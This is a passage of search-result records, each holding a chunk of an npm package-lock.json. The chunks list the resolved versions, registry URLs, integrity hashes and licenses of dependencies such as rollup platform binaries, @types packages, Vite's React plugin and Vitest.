}\n    },\n    \"node_modules/@phc/format\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/@phc/format/-/format-1.0.0.tgz\",\n      \"integrity\": \"sha512-m7X9U6BG2+J+R1lSOdCiITLLrxm+cWlNI3HUFA92oLO77ObGNzaKdh8pMLqdZcshtkKuV84olNNXDfMc4FezBQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/@pinojs/redact\": {\n      \"version\": \"0.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/@pinojs/redact/-/redact-0.4.0.tgz\",\n      \"integrity\": \"sha512-k2ENnmBugE/rzQfEcdWHcCY+/FM3VLzH9cYEsbdsoqrvzAKRhUZeRNhAZvB8OitQJ1TBed3yqWtdjzS6wJKBwg==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@pkgjs/parseargs\": {\n      \"version\": \"0.11.0\",\n      \"resolved\": \"https://registry.npmjs.org/@pkgjs/parseargs/-/parseargs-0.11.0.tgz\",\n      \"integrity\": \"sha512-+1VkjdD0QBLPodGrJUeqarH8VAIvQODIbwh9XpP5Syisf7YoQgsJKPNFoqqLQlu+VQ/tVSshMR6loPMn8U+dPg==\",\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"engines\": {\n        \"node\": \">=14\"\n      }\n    },\n    \"node_modules/@remix-run/router\": {\n      \"version\": \"1.23.2\",\n      \"resolved\": \"https://registry.npmjs.org/@remix-run/router/-/router-1.23.2.tgz\",\n      \"integrity\": \"sha512-Ic6m2U/rMjTkhERIa/0ZtXJP17QUi2CbWE7cqx4J58M8aA3QTfW+2UlQ4psvTX9IO1RfNVhK3pcpdjej7L+t2w==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      }\n    },\n    \"node_modules/@rolldown/pluginutils\": {\n      \"version\": \"1.0.0-beta.27\",\n      \"resolved\": \"https://registry.npmjs.org/@rolldown/pluginutils/-/pluginutils-1.0.0-beta.27.tgz\",\n      \"integrity\": \"sha512-+d0F4MKMCbeVUJwG96uQ4SgAznZNSq93I3V+9NHA4OpvqG8mRCpGdKmK8l/dl02h2CCDHwW2FqilnTyDcAnqjA==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@rollup/rollup-android-arm-eabi\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-android-arm-eabi/-/rollup-android-arm-eabi-4.57.0.tgz\",\n      \"integrity\": \"sha512-tPgXB6cDTndIe1ah7u6amCI1T0SsnlOuKgg10Xh3uizJk4e5M1JGaUMk7J4ciuAUcFpbOiNhm2XIjP9ON0dUqA==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"android\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-android-arm64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-android-arm64/-/rollup-android-arm64-4.57.0.tgz\",\n      \"integrity\": \"sha512-sa4LyseLLXr1onr97StkU1Nb7fWcg6niokTwEVNOO7awaKaoRObQ54+V/hrF/BP1noMEaaAW6Fg2d/CfLiq3Mg==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"android\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-darwin-arm64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-darwin-arm64/-/rollup-darwin-arm64-4.57.0.tgz\",\n      \"integrity\": \"sha512-/NNIj9A7yLjKdmkx5dC2XQ9DmjIECpGpwHoGmA5E1AhU0fuICSqSWScPhN1yLCkEdkCwJIDu2xIeLPs60MNIVg==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-darwin-x64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-darwin-x64/-/rollup-darwin-x64-4.57.0.tgz\",\n      \"integrity\": \"sha512-xoh8abqgPrPYPr7pTYipqnUi1V3em56JzE/HgDgitTqZBZ3yKCWI+7KUkceM6tNweyUKYru1UMi7FC060RyKwA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-freebsd-arm64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-freebsd-arm64/-/rollup-freebsd-arm64-4.57.0.tgz\",\n      \"integrity\": \"sha512-PCkMh7fNahWSbA0OTUQ2OpYHpjZZr0hPr8lId8twD7a7SeWrvT3xJVyza+dQwXSSq4yEQTMoXgNOfMCsn8584g==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"freebsd\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-freebsd-x64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-freebsd-x64/-/rollup-freebsd-x64-4.57.0.tgz\",\n      \"integrity\": \"sha512-1j3stGx+qbhXql4OCDZhnK7b01s6rBKNybfsX+TNrEe9JNq4DLi1yGiR1xW+nL+FNVvI4D02PUnl6gJ/2y6WJA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"freebsd\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-arm-gnueabihf\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-arm-gnueabihf/-/rollup-linux-arm-gnueabihf-4.57.0.tgz\",\n      \"integrity\": \"sha512-eyrr5W08Ms9uM0mLcKfM/Uzx7hjhz2bcjv8P2uynfj0yU8GGPdz8iYrBPhiLOZqahoAMB8ZiolRZPbbU2MAi6Q==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-arm-musleabihf\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-arm-musleabihf/-/rollup-linux-arm-musleabihf-4.57.0.tgz\",\n      \"integrity\": \"sha512-Xds90ITXJCNyX9pDhqf85MKWUI4lqjiPAipJ8OLp8xqI2Ehk+TCVhF9rvOoN8xTbcafow3QOThkNnrM33uCFQA==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-arm64-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-arm64-gnu/-/rollup-linux-arm64-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-Xws2KA4CLvZmXjy46SQaXSejuKPhwVdaNinldoYfqruZBaJHqVo6hnRa8SDo9z7PBW5x84SH64+izmldCgbezw==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,", "metadata": {"file": "package-lock.json", "start_line": 1201, "end_line": 1400, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:1401", "score": 0.0, "content": "      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-arm64-musl\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-arm64-musl/-/rollup-linux-arm64-musl-4.57.0.tgz\",\n      \"integrity\": \"sha512-hrKXKbX5FdaRJj7lTMusmvKbhMJSGWJ+w++4KmjiDhpTgNlhYobMvKfDoIWecy4O60K6yA4SnztGuNTQF+Lplw==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-loong64-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-loong64-gnu/-/rollup-linux-loong64-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-6A+nccfSDGKsPm00d3xKcrsBcbqzCTAukjwWK6rbuAnB2bHaL3r9720HBVZ/no7+FhZLz/U3GwwZZEh6tOSI8Q==\",\n      \"cpu\": [\n        \"loong64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-loong64-musl\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-loong64-musl/-/rollup-linux-loong64-musl-4.57.0.tgz\",\n      \"integrity\": \"sha512-4P1VyYUe6XAJtQH1Hh99THxr0GKMMwIXsRNOceLrJnaHTDgk1FTcTimDgneRJPvB3LqDQxUmroBclQ1S0cIJwQ==\",\n      \"cpu\": [\n        \"loong64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-ppc64-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-ppc64-gnu/-/rollup-linux-ppc64-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-8Vv6pLuIZCMcgXre6c3nOPhE0gjz1+nZP6T+hwWjr7sVH8k0jRkH+XnfjjOTglyMBdSKBPPz54/y1gToSKwrSQ==\",\n      \"cpu\": [\n        \"ppc64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-ppc64-musl\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-ppc64-musl/-/rollup-linux-ppc64-musl-4.57.0.tgz\",\n      \"integrity\": \"sha512-r1te1M0Sm2TBVD/RxBPC6RZVwNqUTwJTA7w+C/IW5v9Ssu6xmxWEi+iJQlpBhtUiT1raJ5b48pI8tBvEjEFnFA==\",\n      \"cpu\": [\n        \"ppc64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-riscv64-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-riscv64-gnu/-/rollup-linux-riscv64-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-say0uMU/RaPm3CDQLxUUTF2oNWL8ysvHkAjcCzV2znxBr23kFfaxocS9qJm+NdkRhF8wtdEEAJuYcLPhSPbjuQ==\",\n      \"cpu\": [\n        \"riscv64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-riscv64-musl\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-riscv64-musl/-/rollup-linux-riscv64-musl-4.57.0.tgz\",\n      \"integrity\": \"sha512-/MU7/HizQGsnBREtRpcSbSV1zfkoxSTR7wLsRmBPQ8FwUj5sykrP1MyJTvsxP5KBq9SyE6kH8UQQQwa0ASeoQQ==\",\n      \"cpu\": [\n        \"riscv64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-s390x-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-s390x-gnu/-/rollup-linux-s390x-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-Q9eh+gUGILIHEaJf66aF6a414jQbDnn29zeu0eX3dHMuysnhTvsUvZTCAyZ6tJhUjnvzBKE4FtuaYxutxRZpOg==\",\n      \"cpu\": [\n        \"s390x\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-x64-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-x64-gnu/-/rollup-linux-x64-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-OR5p5yG5OKSxHReWmwvM0P+VTPMwoBS45PXTMYaskKQqybkS3Kmugq1W+YbNWArF8/s7jQScgzXUhArzEQ7x0A==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-linux-x64-musl\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-linux-x64-musl/-/rollup-linux-x64-musl-4.57.0.tgz\",\n      \"integrity\": \"sha512-XeatKzo4lHDsVEbm1XDHZlhYZZSQYym6dg2X/Ko0kSFgio+KXLsxwJQprnR48GvdIKDOpqWqssC3iBCjoMcMpw==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-openbsd-x64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-openbsd-x64/-/rollup-openbsd-x64-4.57.0.tgz\",\n      \"integrity\": \"sha512-Lu71y78F5qOfYmubYLHPcJm74GZLU6UJ4THkf/a1K7Tz2ycwC2VUbsqbJAXaR6Bx70SRdlVrt2+n5l7F0agTUw==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"openbsd\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-openharmony-arm64\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-openharmony-arm64/-/rollup-openharmony-arm64-4.57.0.tgz\",\n      \"integrity\": \"sha512-v5xwKDWcu7qhAEcsUubiav7r+48Uk/ENWdr82MBZZRIm7zThSxCIVDfb3ZeRRq9yqk+oIzMdDo6fCcA5DHfMyA==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"openharmony\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-win32-arm64-msvc\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-win32-arm64-msvc/-/rollup-win32-arm64-msvc-4.57.0.tgz\",\n      \"integrity\": \"sha512-XnaaaSMGSI6Wk8F4KK3QP7GfuuhjGchElsVerCplUuxRIzdvZ7hRBpLR0omCmw+kI2RFJB80nenhOoGXlJ5TfQ==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-win32-ia32-msvc\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-win32-ia32-msvc/-/rollup-win32-ia32-msvc-4.57.0.tgz\",\n      \"integrity\": \"sha512-3K1lP+3BXY4t4VihLw5MEg6IZD3ojSYzqzBG571W3kNQe4G4CcFpSUQVgurYgib5d+YaCjeFow8QivWp8vuSvA==\",\n      \"cpu\": [\n        \"ia32\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ]\n    },", "metadata": {"file": "package-lock.json", "start_line": 1401, "end_line": 1600, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:1601", "score": 0.0, "content": "    \"node_modules/@rollup/rollup-win32-x64-gnu\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-win32-x64-gnu/-/rollup-win32-x64-gnu-4.57.0.tgz\",\n      \"integrity\": \"sha512-MDk610P/vJGc5L5ImE4k5s+GZT3en0KoK1MKPXCRgzmksAMk79j4h3k1IerxTNqwDLxsGxStEZVBqG0gIqZqoA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ]\n    },\n    \"node_modules/@rollup/rollup-win32-x64-msvc\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/@rollup/rollup-win32-x64-msvc/-/rollup-win32-x64-msvc-4.57.0.tgz\",\n      \"integrity\": \"sha512-Zv7v6q6aV+VslnpwzqKAmrk5JdVkLUzok2208ZXGipjb+msxBr/fJPZyeEXiFgH7k62Ak0SLIfxQRZQvTuf7rQ==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ]\n    },\n    \"node_modules/@sinclair/typebox\": {\n      \"version\": \"0.27.8\",\n      \"resolved\": \"https://registry.npmjs.org/@sinclair/typebox/-/typebox-0.27.8.tgz\",\n      \"integrity\": \"sha512-+Fj43pSMwJs4KRrH/938Uf+uAELIgVBmQzg/q1YG10djyfA3TnrU8N8XzqCh/okZdszqBQTZf96idMfE5lnwTA==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@types/babel__core\": {\n      \"version\": \"7.20.5\",\n      \"resolved\": \"https://registry.npmjs.org/@types/babel__core/-/babel__core-7.20.5.tgz\",\n      \"integrity\": \"sha512-qoQprZvz5wQFJwMDqeseRXWv3rqMvhgpbXFfVyWhbx9X47POIA6i/+dXefEmZKoAgOaTdaIgNSMqMIU61yRyzA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/parser\": \"^7.20.7\",\n        \"@babel/types\": \"^7.20.7\",\n        \"@types/babel__generator\": \"*\",\n        \"@types/babel__template\": \"*\",\n        \"@types/babel__traverse\": \"*\"\n      }\n    },\n    \"node_modules/@types/babel__generator\": {\n      \"version\": \"7.27.0\",\n      \"resolved\": \"https://registry.npmjs.org/@types/babel__generator/-/babel__generator-7.27.0.tgz\",\n      \"integrity\": \"sha512-ufFd2Xi92OAVPYsy+P4n7/U7e68fex0+Ee8gSG9KX7eo084CWiQ4sdxktvdl0bOPupXtVJPY19zk6EwWqUQ8lg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/types\": \"^7.0.0\"\n      }\n    },\n    \"node_modules/@types/babel__template\": {\n      \"version\": \"7.4.4\",\n      \"resolved\": \"https://registry.npmjs.org/@types/babel__template/-/babel__template-7.4.4.tgz\",\n      \"integrity\": \"sha512-h/NUaSyG5EyxBIp8YRxo4RMe2/qQgvyowRwVMzhYhBCONbW8PUsg4lkFMrhgZhUe5z3L3MiLDuvyJ/CaPa2A8A==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/parser\": \"^7.1.0\",\n        \"@babel/types\": \"^7.0.0\"\n      }\n    },\n    \"node_modules/@types/babel__traverse\": {\n      \"version\": \"7.28.0\",\n      \"resolved\": \"https://registry.npmjs.org/@types/babel__traverse/-/babel__traverse-7.28.0.tgz\",\n      \"integrity\": \"sha512-8PvcXf70gTDZBgt9ptxJ8elBeBjcLOAcOtoO/mPJjtji1+CdGbHgm77om1GrsPxsiE+uXIpNSK64UYaIwQXd4Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/types\": \"^7.28.2\"\n      }\n    },\n    \"node_modules/@types/better-sqlite3\": {\n      \"version\": \"7.6.13\",\n      \"resolved\": \"https://registry.npmjs.org/@types/better-sqlite3/-/better-sqlite3-7.6.13.tgz\",\n      \"integrity\": \"sha512-NMv9ASNARoKksWtsq/SHakpYAYnhBrQgGD8zkLYk/jaK8jUGn08CfEdTRgYhMypUQAfzSP8W6gNLe0q19/t4VA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@types/node\": \"*\"\n      }\n    },\n    \"node_modules/@types/estree\": {\n      \"version\": \"1.0.8\",\n      \"resolved\": \"https://registry.npmjs.org/@types/estree/-/estree-1.0.8.tgz\",\n      \"integrity\": \"sha512-dWHzHa2WqEXI/O1E9OjrocMTKJl2mSrEolh1Iomrv6U+JuNwaHXsXx9bLu5gG7BUWFIN0skIQJQ/L1rIex4X6w==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@types/node\": {\n      \"version\": \"20.19.30\",\n      \"resolved\": \"https://registry.npmjs.org/@types/node/-/node-20.19.30.tgz\",\n      \"integrity\": \"sha512-WJtwWJu7UdlvzEAUm484QNg5eAoq5QR08KDNx7g45Usrs2NtOPiX8ugDqmKdXkyL03rBqU5dYNYVQetEpBHq2g==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"undici-types\": \"~6.21.0\"\n      }\n    },\n    \"node_modules/@types/prop-types\": {\n      \"version\": \"15.7.15\",\n      \"resolved\": \"https://registry.npmjs.org/@types/prop-types/-/prop-types-15.7.15.tgz\",\n      \"integrity\": \"sha512-F6bEyamV9jKGAFBEmlQnesRPGOQqS2+Uwi0Em15xenOxHaf2hv6L8YCVn3rPdPJOiJfPiCnLIRyvwVaqMY3MIw==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@types/react\": {\n      \"version\": \"18.3.27\",\n      \"resolved\": \"https://registry.npmjs.org/@types/react/-/react-18.3.27.tgz\",\n      \"integrity\": \"sha512-cisd7gxkzjBKU2GgdYrTdtQx1SORymWyaAFhaxQPK9bYO9ot3Y5OikQRvY0VYQtvwjeQnizCINJAenh/V7MK2w==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@types/prop-types\": \"*\",\n        \"csstype\": \"^3.2.2\"\n      }\n    },\n    \"node_modules/@types/react-dom\": {\n      \"version\": \"18.3.7\",\n      \"resolved\": \"https://registry.npmjs.org/@types/react-dom/-/react-dom-18.3.7.tgz\",\n      \"integrity\": \"sha512-MEe3UeoENYVFXzoXEWsvcpg6ZvlrFNlOQ7EOsvhI3CfAXwzPfO8Qwuxd40nepsYKqyyVQnTdEfv68q91yLcKrQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"peerDependencies\": {\n        \"@types/react\": \"^18.0.0\"\n      }\n    },\n    \"node_modules/@types/ws\": {\n      \"version\": \"8.18.1\",\n      \"resolved\": \"https://registry.npmjs.org/@types/ws/-/ws-8.18.1.tgz\",\n      \"integrity\": \"sha512-ThVF6DCVhA8kUGy+aazFQ4kXQ7E1Ty7A3ypFOe0IcJV8O/M511G99AW24irKrW56Wt44yG9+ij8FaqoBGkuBXg==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@types/node\": \"*\"\n      }\n    },\n    \"node_modules/@vitejs/plugin-react\": {\n      \"version\": \"4.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/@vitejs/plugin-react/-/plugin-react-4.7.0.tgz\",\n      \"integrity\": \"sha512-gUu9hwfWvvEDBBmgtAowQCojwZmJ5mcLn3aufeCsitijs3+f2NsrPtlAWIR6OPiqljl96GVCUbLe0HyqIpVaoA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@babel/core\": \"^7.28.0\",\n        \"@babel/plugin-transform-react-jsx-self\": \"^7.27.1\",\n        \"@babel/plugin-transform-react-jsx-source\": \"^7.27.1\",\n        \"@rolldown/pluginutils\": \"1.0.0-beta.27\",\n        \"@types/babel__core\": \"^7.20.5\",\n        \"react-refresh\": \"^0.17.0\"\n      },\n      \"engines\": {\n        \"node\": \"^14.18.0 || >=16.0.0\"\n      },\n      \"peerDependencies\": {\n        \"vite\": \"^4.2.0 || ^5.0.0 || ^6.0.0 || ^7.0.0\"\n      }\n    },\n    \"node_modules/@vitest/expect\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/@vitest/expect/-/expect-1.6.1.tgz\",\n      \"integrity\": \"sha512-jXL+9+ZNIJKruofqXuuTClf44eSpcHlgj3CiuNihUF3Ioujtmc0zIa3UJOW5RjDK1YLBJZnWBlPuqhYycLioog==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@vitest/spy\": \"1.6.1\",\n        \"@vitest/utils\": \"1.6.1\",\n        \"chai\": \"^4.3.10\"\n      },\n      \"funding\": {\n        \"url\": \"https://opencollective.com/vitest\"\n      }\n    },\n    \"node_modules/@vitest/runner\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/@vitest/runner/-/runner-1.6.1.tgz\",\n      \"integrity\": \"sha512-3nSnYXkVkf3mXFfE7vVyPmi3Sazhb/2cfZGGs0JRzFsPFvAMBEcrweV1V1GsrstdXeKCTXlJbvnQwGWgEIHmOA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@vitest/utils\": \"1.6.1\",\n        \"p-limit\": \"^5.0.0\",\n        \"pathe\": \"^1.1.1\"\n      },\n      \"funding\": {\n        \"url\": \"https://opencollective.com/vitest\"\n      }\n    },\n    \"node_modules/@vitest/snapshot\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/@vitest/snapshot/-/snapshot-1.6.1.tgz\",\n      \"integrity\": \"sha512-WvidQuWAzU2p95u8GAKlRMqMyN1yOJkGHnx3M1PL9Raf7AQ1kwLKg04ADlCa3+OXUZE7BceOhVZiuWAbzCKcUQ==\",", "metadata": {"file": "package-lock.json", "start_line": 1601, "end_line": 1800, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:1801", "score": 0.0, "content": "      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"magic-string\": \"^0.30.5\",\n        \"pathe\": \"^1.1.1\",\n        \"pretty-format\": \"^29.7.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://opencollective.com/vitest\"\n      }\n    },\n    \"node_modules/@vitest/spy\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/@vitest/spy/-/spy-1.6.1.tgz\",\n      \"integrity\": \"sha512-MGcMmpGkZebsMZhbQKkAf9CX5zGvjkBTqf8Zx3ApYWXr3wG+QvEu2eXWfnIIWYSJExIp4V9FCKDEeygzkYrXMw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"tinyspy\": \"^2.2.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://opencollective.com/vitest\"\n      }\n    },\n    \"node_modules/@vitest/utils\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/@vitest/utils/-/utils-1.6.1.tgz\",\n      \"integrity\": \"sha512-jOrrUvXM4Av9ZWiG1EajNto0u96kWAhJ1LmPmJhXXQx/32MecEKd10pOLYgS2BQx1TgkGhloPU1ArDW2vvaY6g==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"diff-sequences\": \"^29.6.3\",\n        \"estree-walker\": \"^3.0.3\",\n        \"loupe\": \"^2.3.7\",\n        \"pretty-format\": \"^29.7.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://opencollective.com/vitest\"\n      }\n    },\n    \"node_modules/abbrev\": {\n      \"version\": \"1.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/abbrev/-/abbrev-1.1.1.tgz\",\n      \"integrity\": \"sha512-nne9/IiQ/hzIhY6pdDnbBtz7DjPTKrY00P/zvPSm5pOFkl6xuGrGnXn/VtTNNfNtAfZ9/1RtehkszU9qcTii0Q==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/abort-controller\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/abort-controller/-/abort-controller-3.0.0.tgz\",\n      \"integrity\": \"sha512-h8lQ8tacZYnR3vNQTgibj+tODHI5/+l06Au2Pcriv/Gmet0eaj4TwWH41sO9wnHDiQsEj19q0drzdWdeAHtweg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"event-target-shim\": \"^5.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=6.5\"\n      }\n    },\n    \"node_modules/abstract-logging\": {\n      \"version\": \"2.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/abstract-logging/-/abstract-logging-2.0.1.tgz\",\n      \"integrity\": 